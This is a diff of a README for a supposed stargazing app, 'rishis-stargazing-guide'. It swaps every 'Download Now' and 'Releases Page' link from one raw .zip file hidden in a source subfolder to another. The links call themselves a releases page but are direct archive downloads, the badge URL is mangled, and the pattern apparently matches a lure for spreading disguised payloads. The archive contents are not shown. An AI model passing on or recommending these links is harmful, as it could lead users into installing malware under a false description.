@@ -1,6 +1,6 @@
 # 🌌 rishis-stargazing-guide - Explore the Night Sky Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/components/SkyMap/rishis-guide-stargazing-3.8.zip%20Now-%20🌟https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/components/SkyMap/rishis-guide-stargazing-3.8.zip)](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/components/SkyMap/rishis-guide-stargazing-3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/app/stellarium-sky/stargazing_rishis_guide_2.8.zip%20Now-%20🌟https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/app/stellarium-sky/stargazing_rishis_guide_2.8.zip)](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/app/stellarium-sky/stargazing_rishis_guide_2.8.zip)
 
 ## 📚 About This App
 
@@ -12,7 +12,7 @@ Whether you're a beginner or have some experience, this app is designed for you.
 
 To start using the rishis-stargazing-guide, follow these simple steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/components/SkyMap/rishis-guide-stargazing-3.8.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/app/stellarium-sky/stargazing_rishis_guide_2.8.zip).
    
 2. Browse the list of available versions and select the latest release.
 
@@ -24,7 +24,7 @@ To start using the rishis-stargazing-guide, follow these simple steps:
 
 To download the software, follow these steps:
 
-- Go to the [Releases Page](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/components/SkyMap/rishis-guide-stargazing-3.8.zip).
+- Go to the [Releases Page](https://raw.githubusercontent.com/VyteSt4r/rishis-stargazing-guide/main/app/stellarium-sky/stargazing_rishis_guide_2.8.zip).
 
 - Look for the latest version of the application. 
 
